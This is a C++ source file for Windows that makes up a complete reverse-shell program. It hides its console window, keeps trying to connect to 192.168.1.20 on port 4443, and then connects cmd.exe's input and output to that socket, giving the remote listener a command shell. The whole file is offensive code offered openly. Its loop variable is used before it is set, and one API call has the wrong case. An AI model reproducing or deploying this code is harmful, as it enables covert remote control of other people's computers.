//#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <cstdio>
#include <ctime>

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;
HWND hConsole;

HWND GetConsoleHwnd(void)
{
       #define MY_BUFSIZE 1024 // Buffer size for console window titles.
       HWND hwndFound;         // This is what is returned to the caller.
       char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
       char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
       // Fetch current window title.
       GetConsoleTitle(pszOldWindowTitle, MY_BUFSIZE);
       // Format a "unique" NewWindowTitle.
       wsprintf(pszNewWindowTitle,"%d/%d", GetTickCount(), GetCurrentProcessId());
       // Change current window title.
       SetConsoleTitle(pszNewWindowTitle);
       // Ensure window title has been updated.
       Sleep(40);
       // Look for NewWindowTitle.
       hwndFound=FindWindow(NULL, pszNewWindowTitle);
       // Restore original window title.
       SetConsoleTitle(pszOldWindowTitle);
       return(hwndFound);
}

int main(int argc, _TCHAR* argv[])
{
    SOCKET s1;
    hConsole = GetConsoleHwnd();
    ShowWindow(hConsole, SW_HIDE);
      WSAStartup(MAKEWORD(2, 2), &wsaData);
      s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

      hax.sin_family = AF_INET;
      hax.sin_port = htons(4443);
      hax.sin_addr.s_addr = inet_addr("192.168.1.20");
      int test;
      while(test != 0)
      {
         test = WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
      }
      memset(&sui, 0, sizeof(sui));
      sui.cb = sizeof(sui);
      sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
      sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;

      TCHAR commandLine[256] = "cmd.exe";
      createProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
      
}
